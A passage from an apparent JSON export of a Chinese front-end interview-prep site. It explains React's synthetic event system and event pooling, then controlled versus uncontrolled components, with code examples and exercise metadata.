*/\n                        /* 事件冒泡阶段，真正的事件处理函数，逻辑是将执行函数push到执行队列的最后面 */\n                        const bubbleListener = getListener(instance, bubbled);\n                        if (bubbleListener != null) {\n                            dispatchListeners.push(bubbleListener);\n                            dispatchInstances.push(instance);\n                            dispatchCurrentTargets.push(currentTarget);\n                        }\n                    }\n              }\n              instance = instance.return;\n         }\n          if (dispatchListeners.length > 0) {\n              /* 将函数执行队列，挂到事件对象event上 */\n            event._dispatchListeners = dispatchListeners;\n            event._dispatchInstances = dispatchInstances;\n            event._dispatchCurrentTargets = dispatchCurrentTargets;\n         }\n        return event\n    }\n}\n\n```\n\n事件插件系统的核心`extractEvents`主要做的事是:\n\n-   ① 首先形成`React`事件独有的合成事件源对象，这个对象，保存了整个事件的信息。将作为参数传递给真正的事件处理函数(handerClick)。\n-   ② 然后声明事件执行队列 ，按照`冒泡`和`捕获`逻辑，从事件源开始逐渐向上，查找dom元素类型HostComponent对应的fiber ，收集上面的 `React` 合成事件，例如 `onClick` / `onClickCapture` ，对于冒泡阶段的事件(`onClick`)，将 `push` 到执行队列后面 ， 对于捕获阶段的事件(`onClickCapture`)，将 `unShift`到执行队列的前面。\n-   ③ 最后将事件执行队列，保存到React事件源对象上。等待执行。\n\n举个例子比如如下\n\n```js\nhanderClick = () => console.log(1)\nhanderClick1 = () => console.log(2)\nhanderClick2 = () => console.log(3) \nhanderClick3= () => console.log(4)\nrender(){\n    return <div onClick={ this.handerClick2 } onClickCapture={this.handerClick3}  > \n        <button onClick={ this.handerClick }  onClickCapture={ this.handerClick1  }  className=\"button\" >点击</button>\n    </div>\n}\n```\n\n打印 // 4 2 1 3\n\n看到这里我们应该知道上述函数打印顺序为什么了吧，首先遍历 `button` 对应的fiber，首先遇到了 `onClickCapture` ,将 `handerClick1` 放到了数组最前面，然后又把`onClick`对应`handerClick`的放到数组的最后面，形成的结构是`[ handerClick1 , handerClick ]` ， 然后向上遍历，遇到了`div`对应fiber,将`onClickCapture`对应的`handerClick3`放在了数组前面，将`onClick`对应的 `handerClick2` 放在了数组后面，形成的结构 `[ handerClick3,handerClick1 , handerClick,handerClick2 ]` ,所以执行的顺序 // 4 2 1 3，就是这么简单，完美！\n\n![FDEBA681-2E03-420B-A838-5907439837A9.jpg](https://static.ecool.fun//article/2f6bc64b-0296-41ce-9dc0-cfb90617d4a6.awebp)\n\n## 事件触发\n\n有的同学可能好奇React的事件源对象是什么样的，以上面代码中`SyntheticEvent`为例子我们一起来看看：\n\n> legacy-events/SyntheticEvent.js/\n\n```js\nfunction SyntheticEvent( dispatchConfig,targetInst,nativeEvent,nativeEventTarget){\n  this.dispatchConfig = dispatchConfig;\n  this._targetInst = targetInst;\n  this.nativeEvent = nativeEvent;\n  this._dispatchListeners = null;\n  this._dispatchInstances = null;\n  this._dispatchCurrentTargets = null;\n  this.isPropagationStopped = () => false; /* 初始化，返回为false  */\n\n}\nSyntheticEvent.prototype={\n    stopPropagation(){ this.isPropagationStopped = () => true;  }, /* React单独处理，阻止事件冒泡函数 */\n    preventDefault(){ },  /* React单独处理，阻止事件捕获函数  */\n    ...\n}\n```\n\n在 `handerClick` 中打印 `e` :\n\n![B9180401-93FF-4EF0-A2FB-C2FA43B29550.jpg](https://static.ecool.fun//article/92a61179-b8f1-49c2-80e6-69d69bf72cb8.awebp)\n\n既然事件执行队列和事件源对象都形成了，接下来就是最后一步**事件触发**了。上面大家有没有注意到一个函数`runEventsInBatch`，所有事件绑定函数，就是在这里触发的。让我们一起看看。\n\n> legacy-events/EventBatching.js\n\n```js\nfunction runEventsInBatch(){\n    const dispatchListeners = event._dispatchListeners;\n    const dispatchInstances = event._dispatchInstances;\n    if (Array.isArray(dispatchListeners)) {\n    for (let i = 0; i < dispatchListeners.length; i++) {\n      if (event.isPropagationStopped()) { /* 判断是否已经阻止事件冒泡 */\n        break;\n      }\n      \n      dispatchListeners[i](event)\n    }\n  }\n  /* 执行完函数，置空两字段 */\n  event._dispatchListeners = null;\n  event._dispatchInstances = null;\n}\n```\n\n`dispatchListeners[i](event)`就是执行我们的事件处理函数比如`handerClick`,从这里我们知道，**我们在事件处理函数中，返回 false ，并不会阻止浏览器默认行为**。\n\n```js\nhanderClick(){ //并不能阻止浏览器默认行为。\n    return false\n}\n```\n\n应该改成这样：\n\n```js\nhanderClick(e){\n    e.preventDefault()\n}\n```\n\n另一方面React对于阻止冒泡，就是通过isPropagationStopped，判断是否已经阻止事件冒泡。如果我们在事件函数执行队列中，某一会函数中，调用`e.stopPropagation()`，就会赋值给`isPropagationStopped=()=>true`，当再执行 `e.isPropagationStopped()`就会返回 `true` ,接下来事件处理函数，就不会执行了。\n\n## 其他概念-事件池\n\n```js\n handerClick = (e) => {\n    console.log(e.target) // button \n    setTimeout(()=>{\n        console.log(e.target) // null\n    },0)\n}\n```\n\n对于一次点击事件的处理函数，在正常的函数执行上下文中打印`e.target`就指向了`dom`元素，但是在`setTimeout`中打印却是`null`，如果这不是React事件系统，两次打印的应该是一样的，但是为什么两次打印不一样呢？ **因为在React采取了一个事件池的概念，每次我们用的事件源对象，在事件函数执行之后，可以通过`releaseTopLevelCallbackBookKeeping`等方法将事件源对象释放到事件池中，这样的好处每次我们不必再创建事件源对象，可以从事件池中取出一个事件源对象进行复用，在事件处理函数执行完毕后,会释放事件源到事件池中，清空属性，这就是`setTimeout`中打印为什么是`null`的原因了。**\n\n## 事件触发总结\n\n我把事件触发阶段做的事总结一下：\n\n-   **①首先通过统一的事件处理函数 `dispatchEvent`,进行批量更新batchUpdate。**\n    \n-   **②然后执行事件对应的处理插件中的`extractEvents`，合成事件源对象,每次React会从事件源开始，从上遍历类型为 hostComponent即 dom类型的fiber,判断props中是否有当前事件比如onClick,最终形成一个事件执行队列，React就是用这个队列，来模拟事件捕获->事件源->事件冒泡这一过程。**\n    \n-   **③最后通过`runEventsInBatch`执行事件队列，如果发现阻止冒泡，那么break跳出循环，最后重置事件源，放回到事件池中，完成整个流程。**\n    \n\n![evnent_click.jpg](https://static.ecool.fun//article/9c358264-e74e-44bb-b864-0d2f9ba9387a.awebp)\n\n# 五 关于react v17版本的事件系统\n\nReact v17 整体改动不是很大，但是事件系统的改动却不小，首先上述的很多执行函数，在v17版本不复存在了。我来简单描述一下v17事件系统的改版。\n\n**1 事件统一绑定container上，ReactDOM.render(app， container);而不是document上，这样好处是有利于微前端的，微前端一个前端系统中可能有多个应用，如果继续采取全部绑定在`document`上，那么可能多应用下会出现问题。**\n\n![react_17_delegation.png](https://static.ecool.fun//article/e4c6db3e-7162-4a7b-aefd-a97e00ca391a.awebp)\n\n**2 对齐原生浏览器事件**\n\n`React 17` 中终于支持了原生捕获事件的支持， 对齐了浏览器原生标准。同时 `onScroll` 事件不再进行事件冒泡。`onFocus` 和 `onBlur` 使用原生 `focusin`， `focusout` 合成。\n\n**3 取消事件池** `React 17` 取消事件池复用，也就解决了上述在`setTimeout`打印，找不到`e.target`的问题。",
    "testPoint": "React 的事件机制是前端面试的重要考点，涉及 **合成事件（SyntheticEvent）、事件代理、事件传播机制** 以及 **与原生事件的区别** 等多个方向。\n\n## **1. React 的事件系统**\n### **(1) 合成事件（SyntheticEvent）**\n- React 并不直接使用原生 DOM 事件，而是采用 **合成事件（SyntheticEvent）** 进行封装：\n  - 统一事件处理，兼容不同浏览器。\n  - 事件对象是 **React 维护的对象**，它会被 **事件池（Event Pooling）** 复用，提升性能。\n  - 事件在**所有浏览器中表现一致**，避免浏览器差异带来的问题。\n\n  **示例：**\n  ```jsx\n  function handleClick(event) {\n    console.log(event); // 这是一个 SyntheticEvent\n    console.log(event.nativeEvent); // 获取原生事件对象\n  }\n\n  return <button onClick={handleClick}>Click me</button>;\n  ```\n  **考察点**\n  - **`event.nativeEvent` 获取原生事件**。\n  - **合成事件的属性（如 `event.preventDefault()`、`event.stopPropagation()`）**。\n\n---\n\n### **(2) React 的事件代理**\n- React **并不会直接把事件绑定到 DOM 元素上**，而是采用**事件代理机制**：\n  - 事件会**委托到最外层的 `document`**，然后通过 **事件冒泡机制** 触发组件内的事件处理函数。\n  - 这种方式可以减少事件绑定，提高性能，适用于**大规模列表渲染**的场景。\n\n  **示例：**\n  ```jsx\n  function App() {\n    return (\n      <div onClick={() => console.log(\"Parent Div Clicked\")}>\n        <button onClick={(e) => e.stopPropagation()}>Click me</button>\n      </div>\n    );\n  }\n  ```\n  **考察点**\n  - **为什么 React 采用事件代理？**\n  - **事件绑定在哪里？（默认是 `document` 上）**\n  - **如何阻止事件冒泡？（`e.stopPropagation()`）**\n\n---\n\n### **(3) React 事件的绑定方式**\n- 事件绑定可以是**箭头函数、bind 绑定、class 方法**：\n  ```jsx\n  class App extends React.Component {\n    handleClick() {\n      console.log(this); // 这里的 this 需要绑定\n    }\n\n    render() {\n      return (\n        <button onClick={this.handleClick.bind(this)}>Click Me</button>\n      );\n    }\n  }\n  ```\n  **考察点**\n  - **事件绑定时 `this` 指向问题**。\n  - **为什么 `bind(this)` 可能会影响性能？（每次 render 都创建新函数）**\n  - **箭头函数 `onClick={() => this.handleClick()}` 有什么优缺点？**\n\n---\n\n### **(4) 事件传播机制（捕获 & 冒泡）**\n- React 的事件默认**只支持冒泡，不支持捕获**，但可以通过 `onClickCapture` 监听捕获阶段：\n  ```jsx\n  function App() {\n    return (\n      <div onClickCapture={() => console.log(\"捕获阶段：父元素\")}>\n        <button onClick={() => console.log(\"冒泡阶段：子元素\")}>\n          Click Me\n        </button>\n      </div>\n    );\n  }\n  ```\n  **考察点**\n  - **React 事件默认是冒泡的**。\n  - **如何监听捕获阶段？（`onClickCapture`）**。\n\n---\n\n### **(5) React 事件的 `stopPropagation` 和 `preventDefault`**\n- **`stopPropagation()`**: 阻止事件冒泡（但在 React 事件代理下，可能仍会触发 `document` 上的监听）。\n- **`preventDefault()`**: 阻止默认行为，如 `submit` 提交表单。\n\n  **示例：**\n  ```jsx\n  function App() {\n    return (\n      <form onSubmit={(e) => e.preventDefault()}>\n        <button type=\"submit\">Submit</button>\n      </form>\n    );\n  }\n  ```\n  **考察点**\n  - **`e.stopPropagation()` 是否能阻止 React 代理到 `document` 的事件？**\n  - **合成事件和原生事件的 `preventDefault()` 有什么区别？**\n\n---\n\n## **2. React 事件与原生 DOM 事件的区别**\n|  | React 事件（SyntheticEvent） | 原生事件（DOM Event） |\n|---|---|---|\n| 绑定方式 | 事件代理到 `document` | 直接绑定到 DOM |\n| 事件对象 | `SyntheticEvent`（封装） | `Event` |\n| `event.stopPropagation()` | 只能阻止 React 事件 | 直接阻止 DOM 事件 |\n| `event.preventDefault()` | 适用于 React | 适用于 DOM |\n\n**考察点**\n- **如何在 React 事件中绑定原生事件？**\n  ```jsx\n  useEffect(() => {\n    const handleScroll = () => console.log(\"Scrolling...\");\n    window.addEventListener(\"scroll\", handleScroll);\n    return () => window.removeEventListener(\"scroll\", handleScroll);\n  }, []);\n  ```\n- **React 事件的 `event.persist()` 作用是什么？**\n  ```jsx\n  function handleClick(event) {\n    event.persist(); // 让事件对象不会被回收\n    console.log(event);\n  }\n  ```\n\n---\n\n## **3. React 事件的性能优化**\n### **(1) 避免重复绑定**\n- **错误方式（每次 render 重新创建函数）：**\n  ```jsx\n  <button onClick={() => handleClick()}>Click</button>\n  ```\n- **优化方式（使用 `useCallback` 或 `class` 方法）：**\n  ```jsx\n  const handleClick = useCallback(() => {\n    console.log(\"Clicked\");\n  }, []);\n  <button onClick={handleClick}>Click</button>;\n  ```\n\n---\n\n### **(2) 使用事件委托优化大量事件**\n- 在 **长列表** 中，如果每个子元素都绑定 `onClick`，会导致大量事件监听：\n  ```jsx\n  {items.map(item => (\n    <button key={item.id} onClick={() => handleClick(item.id)}>Click</button>\n  ))}\n  ```\n- **优化方式（事件代理到父元素）：**\n  ```jsx\n  <div onClick={(e) => {\n    if (e.target.tagName === \"BUTTON\") {\n      console.log(\"Button Clicked\");\n    }\n  }}>\n    {items.map(item => (\n      <button key={item.id} data-id={item.id}>Click</button>\n    ))}\n  </div>\n  ```\n\n## **常见问题总结**\n1. **React 为什么使用合成事件？**\n2. **React 事件和原生事件的区别？**\n3. **React 事件是否支持捕获？如何监听捕获事件？**\n4. **事件 `e.stopPropagation()` 和 `e.preventDefault()` 如何使用？**\n5. **为什么 `bind(this)` 可能影响性能？如何优化？**\n6. **事件委托的原理及应用场景？**\n7. **如何在 React 事件中使用 `event.persist()`？**\n8. **React 如何监听原生事件？如何清理？**",
    "exerciseKeyList": "[\"3db534b5-5ef5-44e8-b156-54ee7f1bcc70\",\"e8631603-4764-426e-b62b-ddd6dd663d4f\",\"37cce645-6114-44e4-a440-3b7f0c9f8887\",\"a9a357ca-9ee4-404d-a48a-49ba46f78166\",\"116db48b-6ad5-40f1-9f60-c5a525673395\",\"eaf64af1-8d01-495c-b9ca-c1d503e3ed8d\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:39:10.000Z",
    "updateAt": "2025-03-14T08:02:07.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "116db48b-6ad5-40f1-9f60-c5a525673395",
        "title": "React 的事件代理机制和原生事件绑定有什么区别？\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:02:03.000Z",
        "updateAt": "2024-08-10T17:05:01.000Z"
      },
      {
        "exerciseKey": "37cce645-6114-44e4-a440-3b7f0c9f8887",
        "title": "React 中如果绑定事件使用匿名函数有什么影响？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:03:14.000Z",
        "updateAt": "2021-07-04T21:29:24.000Z"
      },
      {
        "exerciseKey": "3db534b5-5ef5-44e8-b156-54ee7f1bcc70",
        "title": "子组件是一个 Portal，发生点击事件能冒泡到父组件吗？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-04-19T01:39:34.000Z",
        "updateAt": "2024-07-22T10:11:18.000Z"
      },
      {
        "exerciseKey": "a9a357ca-9ee4-404d-a48a-49ba46f78166",
        "title": "React 的事件代理机制和原生事件绑定混用会有什么问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:02:36.000Z",
        "updateAt": "2021-07-04T21:29:28.000Z"
      },
      {
        "exerciseKey": "e8631603-4764-426e-b62b-ddd6dd663d4f",
        "title": "说说React事件和原生事件的执行顺序",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-04-05T08:37:38.000Z",
        "updateAt": "2025-11-05T08:12:06.000Z"
      },
      {
        "exerciseKey": "eaf64af1-8d01-495c-b9ca-c1d503e3ed8d",
        "title": "简述下 React 的事件代理机制？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:01:29.000Z",
        "updateAt": "2024-08-10T17:05:01.000Z"
      }
    ]
  },
  "202": {
    "id": 202,
    "tagId": 13,
    "title": "受控组件和非受控组件",
    "explanation": "前端开发经常会涉及表单的处理，或者其他一些用于输入的组件，比如日历组件。\n\n涉及到输入，就绕不开受控模式和非受控模式的概念。\n\n什么是受控，什么是非受控呢？\n\n想一下，改变表单值只有两种情况：\n\n![](https://static.ecool.fun//article/17aa3c05-6c45-4719-931e-de67fa2ca856.)\n\n用户去改变 value 或者代码去改变 value。\n\n如果不能通过代码改表单值 value，那就是非受控，也就是不受我们控制。\n\n但是代码可以给表单设置初始值 defaultValue。\n\n![](https://static.ecool.fun//article/20673767-7f67-4ab2-be8a-6c58a8be6e65.)\n\n代码设置表单的初始 value，但是能改变 value 的只有用户，代码通过监听 onChange 来拿到最新的值，或者通过 ref 拿到 dom 之后读取 value。\n\n这种就是非受控模式。\n\n反过来，代码可以改变表单的 value，就是受控模式。\n\n![](https://static.ecool.fun//article/f3b436fe-86c7-4a97-b14b-0641979f64d4.)\n\n注意，value 和 defaultValue 不一样：\n\ndefaultValue 会作为 value 的初始值，后面用户改变的是 value。\n\n而一旦你给 input 设置了 value，那用户就不能修改它了，可以输入触发 onChange 事件，但是表单的值不会变。\n\n用户输入之后在 onChange 事件里拿到输入，然后通过代码去设置 value。\n\n这就是受控模式。\n\n其实绝大多数情况下，非受控就可以了，因为我们只是要拿到用户的输入，不需要手动去修改表单值。\n\n但有的时候，你需要根据用户的输入做一些处理，然后设置为表单的值，这种就需要受控模式。\n\n或者你想同步表单的值到另一个地方的时候，类似 Form 组件，也可以用受控模式。\n\n**value 由用户控制就是非受控模式，由代码控制就是受控模式**。\n\n我们写代码试一下：\n\n```lua\nnpx create-vite\n```\n\n![](https://static.ecool.fun//article/7d84e1ea-670a-4ec4-972a-17f77c8f06d9.)\n\n创建 vite + react 的项目。\n\n去掉 main.tsx 的 index.css 和 StrictMode：\n\n![](https://static.ecool.fun//article/73b30641-e8c9-45f9-8cea-51c6b56f4bb0.)\n\n改下 App.tsx\n\n```javascript\nimport { ChangeEvent } from \"react\"\n\nfunction App() {\n\n  function onChange(event: ChangeEvent<HTMLInputElement>) {\n    console.log(event.target.value);\n  }\n\n  return <input defaultValue={'guang'} onChange={onChange}/>\n}\n\nexport default App\n```\n\n跑一下开发服务：\n\n```arduino\nnpm install\nnpm run dev\n```\n\n![](https://static.ecool.fun//article/0715a5de-c670-4362-ace6-4ddaec2932b9.)\n\n看下效果：\n\n![](https://static.ecool.fun//article/7f2e6f0c-4041-4619-9a24-774b8423c549.)\n\ndefaultValue 作为 value 的初始值，然后用户输入触发 onChange 事件，通过 event.target 拿到了 value。\n\n当然，非受控模式也不一定通过 onChange 拿到最新 value，通过 ref 也可以。\n\n```javascript\nimport { useEffect, useRef } from \"react\"\n\nfunction App() {\n\n  const inputRef = useRef<HTMLInputElement>(null);\n\n  useEffect(() => {\n    setTimeout(() => {\n      console.log(inputRef.current?.value);\n    }, 2000);\n  }, []);\n\n  return <input defaultValue={'guang'} ref={inputRef}/>\n}\n\nexport default App\n```\n\n![](https://static.ecool.fun//article/a1448df7-e194-4998-ae6f-176764640e8e.)\n\n接下来看下受控模式的写法：\n\n```javascript\nimport { ChangeEvent, useState } from \"react\"\n\nfunction App() {\n\n  const [value, setValue] = useState('guang');\n\n  function onChange(event: ChangeEvent<HTMLInputElement>) {\n    console.log(event.target.value);\n    // setValue(event.target.value);\n  }\n\n  return <input value={value} onChange={onChange}/>\n}\n\nexport default App\n```\n\n我们先把 setValue 注释掉，看下用户可不可以改：\n\n![](https://static.ecool.fun//article/5a81f612-6aa1-48e9-b727-c21fee2d0c09.)\n\n可以看到，用户可以输入，onChange 也可以拿到输入后的表单值，但是 value 并没有变。\n\n把 setValue 那一行注释去掉就可以了。\n\n![](https://static.ecool.fun//article/ae21b9ff-3d0a-41e6-9398-4c7ba8c44d8d.)\n\n虽然功能上差不多，但这种写法并不推荐：\n\n![](https://static.ecool.fun//article/e626c2de-0a22-4d35-9027-d3a3b0b02844.)\n\n你不让用户自己控制，而是通过代码控制，绕了一圈结果也没改 value 的值，还是原封不动的，图啥呢？\n\n而且受控模式每次 setValue 都会导致组件重新渲染。\n\n试一下：\n\n![](https://static.ecool.fun//article/e9fdea33-20f0-4cc8-91d9-ccc0b27df812.)\n\n![](https://static.ecool.fun//article/bbfedfa7-b7f4-44ec-a11f-2d0672729358.)\n\n每次输入都会 setValue，然后触发组件重新渲染：\n\n而非受控模式下只会渲染一次：\n\n![](https://static.ecool.fun//article/a762de4d-5692-4da7-95ea-c08a6214dfe8.)\n\n![](https://static.ecool.fun//article/1fbbcc7f-48bc-478e-8df8-ae6ca3732a61.)\n\n绕了一圈啥也没改，还导致很多组件的重新渲染，那你用受控模式图啥呢？\n\n那什么情况用受控模式呢？\n\n当然是你**需要对输入的值做处理之后设置到表单的时候，或者是你想实时同步状态值到父组件。**\n\n比如把用户输入改为大写：\n\n```javascript\nimport { ChangeEvent, useState } from \"react\"\n\nfunction App() {\n\n  const [value, setValue] = useState('guang');\n\n  function onChange(event: ChangeEvent<HTMLInputElement>) {\n    console.log(event.target.value)\n    setValue(event.target.value.toUpperCase());\n  }\n\n  return <input value={value} onChange={onChange}/>\n}\n\nexport default App\n```\n\n![](https://static.ecool.fun//article/48f9469b-4846-447b-89cc-abd20de94909.)\n\n这种，需要把用户的输入修改一下再设置 value 的。\n\n但这种场景其实很少。\n\n有的同学可能会说 Form 组件，确实，用 Form.Item 包裹的表单项都是受控组件：\n\n![](https://static.ecool.fun//article/8ac669ee-3795-49cd-9f6c-ffd443aed999.)\n\n确实，那是因为 Form 组件内有一个 Store，会把表单值同步过去，然后集中管理和设置值：\n\n![](https://static.ecool.fun//article/34f33d5a-78ec-4da2-8393-a3884d064aa8.)\n\n但也因为都是受控组件，随着用户的输入，表单重新渲染很多次，性能会不好。\n\n如果是单独用的组件，比如 Calendar，那就没必要用受控模式了，用非受控模式，设置 defaultValue 就可以了。\n\n很多人上来就设置 value，然后监听 onChange，但是绕了一圈又原封不动的把用户输入转为 value。\n\n没啥意义，还平白导致组件的很多次重新渲染。\n\n除了原生表单元素外，组件也需要考虑受控和非受控的情况。\n\n比如日历组件：\n\n![](https://static.ecool.fun//article/2b6021b7-d33c-493d-84bc-94aa5c8bcea7.)\n\n它的参数就要考虑是支持非受控模式的 defaultValue，还是用受控模式的 value + onChange。\n\n如果这是一个业务组件，那基本就是用非受控模式的 defaultValue 了，调用方只要拿到用户的输入就行。\n\n用受控模式的 value 还要 setValue 触发额外的渲染。\n\n但是基础组件不能这样，你得都支持，让调用者自己去选择。\n\nant design 的 Calendar 组件就是这样的：\n\n![](https://static.ecool.fun//article/ac4445b1-63aa-4b27-98a3-5a64a7a13db8.)\n\n![](https://static.ecool.fun//article/35ad0f57-680e-462d-aae0-c0de1e426cd0.)\n\nColorPicker 组件也是： ![](https://static.ecool.fun//article/b71271a9-b8c1-451f-b2d4-ca07105720f4.)\n\n![](https://static.ecool.fun//article/8aae2804-ad3b-4070-b48f-3df923f248fb.)\n\n它同时支持了受控组件和非受控组件。\n\n咋做到的呢？\n\n我们来试试：\n\n首先写下非受控组件的写法：\n\n```javascript\nimport { ChangeEvent, useState } from \"react\"\n\ninterface CalendarProps{\n  defaultValue?: Date;\n  onChange?: (date: Date) => void;\n}\nfunction Calendar(props: CalendarProps) {\n  \n  const {\n    defaultValue = new Date(),\n    onChange\n  } = props;\n\n  const [value, setValue] = useState(defaultValue);\n\n  function changeValue(date: Date) {\n    setValue(date);\n    onChange?.(date);\n  } \n\n\n  return <div>\n    {value.toLocaleDateString()}\n    <div onClick={()=> {changeValue(new Date('2024-5-1'))}}>2023-5-1</div>\n    <div onClick={()=> {changeValue(new Date('2024-5-2'))}}>2023-5-2</div>\n    <div onClick={()=> {changeValue(new Date('2024-5-3'))}}>2023-5-3</div>\n  </div>\n}\n\nfunction App() {\n  return <Calendar defaultValue={new Date('2024-5-1')} onChange={(date) => {\n    console.log(date.toLocaleDateString());\n  }}/>\n}\n\nexport default App\n```\n\n这里 Calendar 组件传入 defaultValue 和 onChange 参数。\n\ndefaultValue 会作为 value 的初始值，然后用户点击不同日期会修改 value，然后回调 onChange 函数。\n\n这种情况，调用者只能设置 defaultValue 初始值，不能直接修改 value，所以是非受控模式。\n\n试一下；\n\n![](https://static.ecool.fun//article/90fe01fb-d6b1-441a-84bb-cd7d1412dff5.)\n\n然后再来写下受控模式的版本：\n\n```javascript\nimport { ChangeEvent, useEffect, useState } from \"react\"\n\ninterface CalendarProps{\n  value: Date;\n  onChange?: (date: Date) => void;\n}\nfunction Calendar(props: CalendarProps) {\n  \n  const {\n    value,\n    onChange\n  } = props;\n\n  function changeValue(date: Date) {\n    onChange?.(date);\n  } \n\n  return <div>\n    {value.toLocaleDateString()}\n    <div onClick={()=> {changeValue(new Date('2024-5-1'))}}>2023-5-1</div>\n    <div onClick={()=> {changeValue(new Date('2024-5-2'))}}>2023-5-2</div>\n    <div onClick={()=> {changeValue(new Date('2024-5-3'))}}>2023-5-3</div>\n  </div>\n}\n\nfunction App() {\n  const [value, setValue] = useState(new Date('2024-5-1'));\n\n  return <Calendar value={value} onChange={(date) => {\n    console.log(date.toLocaleDateString());\n    setValue(date);\n  }}/>\n}\n\nexport default App\n```\n\n直接用 props 传入的 value，然后切换日期的时候回调 onChange 函数：\n\n![](https://static.ecool.fun//article/dba0dfb2-5f35-4a71-8eda-573cf58a988f.)\n\nvalue 的值的维护在调用方。\n\n这就是受控组件的写法：\n\n![](https://static.ecool.fun//article/3cb7a221-6200-497c-a1ef-ef7f09a8f008.)\n\n那能不能同时支持受控和非受控模式呢？\n\n可以的，组件库基本都是这么做的：\n\n```javascript\nimport { useEffect, useRef, useState } from \"react\"\n\ninterface CalendarProps{\n  value?: Date;\n  defaultValue?: Date;\n  onChange?: (date: Date) => void;\n}\n\nfunction Calendar(props: CalendarProps) {\n  \n  const {\n    value: propsValue,\n    defaultValue,\n    onChange\n  } = props;\n\n  const [value, setValue] = useState(() => {\n    if (propsValue !== undefined) {\n      return propsValue;\n    } else {\n      return defaultValue;\n    }\n  });\n\n  const isFirstRender = useRef(true);\n\n  useEffect(() => {\n    if(propsValue === undefined && !isFirstRender.current) {\n      setValue(propsValue);\n    }\n    isFirstRender.current = false;\n  }, [propsValue]);\n\n  const mergedValue = propsValue === undefined ? value : propsValue;\n\n  function changeValue(date: Date) {\n    if (propsValue === undefined) {\n      setValue(date);\n    }\n    onChange?.(date);\n  } \n\n  return <div>\n    {mergedValue?.toLocaleDateString()}\n    <div onClick={()=> {changeValue(new Date('2024-5-1'))}}>2023-5-1</div>\n    <div onClick={()=> {changeValue(new Date('2024-5-2'))}}>2023-5-2</div>\n    <div onClick={()=> {changeValue(new Date('2024-5-3'))}}>2023-5-3</div>\n  </div>\n}\n\nfunction App() {\n  return <Calendar defaultValue={new Date('2024-5-1')} onChange={(date) => {\n    console.log(date.toLocaleDateString());\n  }}/>\n}\n\nexport default App\n```\n\n参数同时支持 value 和 defaultValue，通过判断 value 是不是 undefined 来区分受控模式和非受控模式。\n\n![](https://static.ecool.fun//article/fb203d34-a2ca-493f-af3c-84e94ffff645.)\n\n如果是受控模式，useState 的初始值设置 props.value，然后渲染用 props.value。\n\n如果是非受控模式，那渲染用内部 state 的 value，然后 changeValue 里 setValue。\n\n当不是首次渲染，但 value 变为 undefined 的情况，也就是从受控模式切换到了非受控模式，要同步设置 state 为 propsValue。\n\n这样，组件就同时支持了受控和非受控模式。\n\n测试下：\n\n非受控模式：\n\n![](https://static.ecool.fun//article/bdd7d232-ff36-48c6-8ac7-ba31a5c963f1.)\n\n![](https://static.ecool.fun//article/042972bb-94bb-4ddc-8610-85d990a50faa.)\n\n受控模式：\n\n![](https://static.ecool.fun//article/d2d00fda-1a1b-4d22-9e49-0f9b012d3e17.)\n\n![](https://static.ecool.fun//article/7dd33989-44ec-4b99-9c58-801333566750.)\n\n其实组件库也都是这么做的。\n\n比如 [arco design 的 useMergeValue 的 hook](https://github.com/arco-design/arco-design/blob/1e677c3c5bba72728668c40d78faea6536c480a8/components/_util/hooks/useMergeValue.ts \"https://github.com/arco-design/arco-design/blob/1e677c3c5bba72728668c40d78faea6536c480a8/components/_util/hooks/useMergeValue.ts\")：\n\n![](https://static.ecool.fun//article/7ea43cc0-9ef0-4feb-a9ba-26df3f7c6561.)\n\n代码差不多，它也是 useState 根据 value 是不是 undefined 来设置 value 或者 defaultValue。\n\n不过它这里又加了一个默认值，没有 defaultValue 的时候用它哪个 defaultStateValue。\n\n然后渲染用的 state 根据 value 是不是 undefind 来判断受控非受控从而决定用 props 的 value 还是 state 的 value。\n\n它也处理了 value 从别的值变为 undefined 的情况：\n\n![](https://static.ecool.fun//article/8a9daf09-085a-4439-8950-8be4c6618bfc.)\n\n保存了之前的 value，判断是从 props.value 别的值变为 undefined 的情况再修改内部 state 为这个 value。\n\n这里保存之前的值是用的 useRef：\n\n![](https://static.ecool.fun//article/229722fd-10f8-41f1-a342-b7f6ae4ee7bb.)\n\nref 的特点是修改了 current 属性不会导致渲染。\n\n我们是判断非首次渲染，但是 props.value 变为了 undefined，效果一样。\n\n再比如 ant design 的工具包 rc-util 里的 [useMergedValue](https://github.com/react-component/util/blob/master/src/hooks/useMergedState.ts \"https://github.com/react-component/util/blob/master/src/hooks/useMergedState.ts\") 的 hook：\n\n![](https://static.ecool.fun//article/cbaaaacf-d6fd-4bce-9458-113299db5a16.)\n\n它也是 useState 根据 value 是不是 undefined 来设置 value 或者 defaultValue\n\n然后又加了一个默认值，没有 defaultValue 的时候用它那个 defaultStateValue。\n\n渲染的时候也是判断 value 是不是 undefind 来决定用 props.value 还是 state 的 value：\n\n![](https://static.ecool.fun//article/3ac9c270-a8fc-4834-9c99-b5b867cb1fbb.)\n\n并且也做了别的值变为 undefined 的处理。\n\n![](https://static.ecool.fun//article/078f7cf4-b83f-469c-850f-5b4e9394b11d.)\n\n大家都这么搞，我们也来封装个 hook：\n\n```javascript\nfunction useMergeState<T>(\n  defaultStateValue: T,\n  props?: {\n    defaultValue?: T,\n    value?: T\n  }\n): [T, React.Dispatch<React.SetStateAction<T>>,] {\n  const { defaultValue, value: propsValue } = props || {};\n\n  const isFirstRender = useRef(true);\n\n  const [stateValue, setStateValue] = useState<T>(() => {\n    if (propsValue !== undefined) {\n      return propsValue!;\n    } else if(defaultValue !== undefined){\n      return defaultValue!;\n    } else {\n      return defaultStateValue;\n    }\n  });\n\n  useEffect(() => {\n    if(propsValue === undefined && !isFirstRender.current) {\n      setStateValue(propsValue!);\n    }\n\n    isFirstRender.current = false;\n  }, [propsValue]);\n\n  const mergedValue = propsValue === undefined ? stateValue : propsValue;\n\n  return [mergedValue, setStateValue]\n}\n```\n\n用一下：\n\n```javascript\ninterface CalendarProps{\n  value?: Date;\n  defaultValue?: Date;\n  onChange?: (date: Date) => void;\n}\n\nfunction Calendar(props: CalendarProps) {\n  const {\n    value: 